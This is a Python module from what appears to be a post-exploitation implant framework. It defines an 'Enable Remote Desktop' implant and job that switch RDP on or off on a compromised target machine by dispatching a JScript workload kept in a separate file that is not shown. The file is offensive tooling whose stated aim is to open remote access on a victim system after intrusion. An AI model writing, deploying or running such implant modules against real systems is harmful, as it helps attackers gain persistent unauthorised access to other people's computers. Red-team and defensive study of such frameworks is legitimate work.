import core.job
import core.implant
import uuid

class EnableRDesktopJob(core.job.Job):
    def create(self):
        mode = "0" if self.options.get("ENABLE") == "true" else "1"
        self.options.set("MODE", mode)
    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(str(self.errno))

class EnableRDesktopImplant(core.implant.Implant):

    NAME = "Enable Remote Desktop"
    DESCRIPTION = "Enables RDP on the target system."
    AUTHORS = ["RiskSense, Inc."]
    STATE = "implant/manage/enable_rdesktop"

    def load(self):
        self.options.register("ENABLE", "true", "toggle to enable or disable", enum=["true", "false"])
        self.options.register("MODE", "", "the value for this script", hidden=True)

    def job(self):
        return EnableRDesktopJob

    def run(self):
        workloads = {}
        #workloads["vbs"] = self.load_script("data/implant/manage/enable_rdesktop.vbs", self.options)
        workloads["js"] = "data/implant/manage/enable_rdesktop.js"

        self.dispatch(workloads, self.job)
